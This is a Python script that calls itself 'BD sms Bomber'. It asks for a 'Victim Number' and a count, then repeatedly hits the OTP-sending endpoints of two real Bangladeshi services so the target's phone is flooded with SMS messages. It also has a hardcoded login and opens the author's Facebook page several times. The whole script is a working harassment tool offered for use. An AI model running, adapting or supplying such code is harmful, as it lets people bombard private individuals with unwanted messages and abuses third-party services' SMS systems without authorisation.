import os,sys,time,datetime
import requests
bl="\33[94m"
re="\033[91m"
li="\033[94m"
w="\33[97m"
y="\33[93m"
g="\033[1;32m"
cy="\033[96m"
end="\033[0m"



os.system('clear')
info="""    ╔===================================================╗
    ║ [•] Author   => Devil King                        ║
    ║ [•] Tool     => BD sms Bomber                     ║
    ║ [•] GitHub   => https://www.github.com/d3v1l-k1n9 ║
    ║ [•] Coded by => Monayem Hossain                   ║
    ╚===================================================╝
"""
os.system("xdg-open https://www.facebook.com/DEVIL.KING.M0NAYEM")
os.system("lolcat login.txt")
print(y+info)

name='MONAYEM'
password='Devil King'

usr=str(input(cy+"Username => "))
print("  ")
pas=str(input(g+"Password => "))

if name==usr and password==pas:
  print(g+"Login Successful ☑️")
  time.sleep(2)
  os.system('clear')
  
  pass 

else:
  print(re+"[×] Wrong Username or Password try agin ")
  os.system("xdg-open https://www.facebook.com/DEVIL.KING.M0NAYEM"),
  sys.exit()

 

logo="""
   █████╗ ██╗  ██╗        ██████╗  ██████╗ ███╗   ███╗██████╗ 
   █╔══██╗██║ ██╔╝        ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗
   █║  ██║█████╔╝   ████╗ ██████╔╝██║   ██║██╔████╔██║██████╔╝
   █║  ██║██╔═██╗   ╚═══╝ ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗
   █████╔╝██║  ██╗        ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝
   ╚═════╝╚═╝  ╚═╝        ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ 
                                                😈DEVIL KING😈
================================================================                                                      
"""
os.system("xdg-open https://www.facebook.com/DEVIL.KING.M0NAYEM")
print(cy+logo)

print(w+"["+re+" 1."+w+"]"+g+"START" " " +cy+"BOM"+li+"BING  ")
print(g)
print(w+"["+re+" 2."+w+"]"+w+"E"+g+"X"+re+"I"+cy+"T")

inp=str(input(g+"Enter"  +re+" Your"  +g+" Choice"+w+" => "))
if inp=="2":
        print("\n          ♥️♥️Thanks For Using My Tool♥️♥️"),
        os.system("xdg-open https://www.facebook.com/DEVIL.KING.M0NAYEM"),
        time.sleep(1),
        exit()
        
        

elif inp=='1':
  time.sleep(2)
  os.system('clear')
  print(cy+logo),
  
  number=str(input(g+"\n Enter your Victim Number"+cy+"(without"+w+" +88 ) => "))
  
  amount=int(input(g+"        Enter amount =>  "))
else:
  print (re+"\n • Invalid Choice• \n • Try again •"),
  exit()
  pass
  
api="https://www.shwapno.com/WebAPI/CRMActivation/Validate?Channel=W&otpCRMrequired=false&otpeCOMrequired=true&smssndcnt=8&otpBasedLogin=false&LoyaltyProvider=&MobileNO="+number+"&countryPhoneCode=%2B88"
url="https://ss.binge.buzz/otp/send/login"

data={'phone':number}
  
for i in range(amount):
  requests.get(api)
  requests.post(url,data=data)
  
  print(str(i+1)+" Send Successfully ☑️")
  
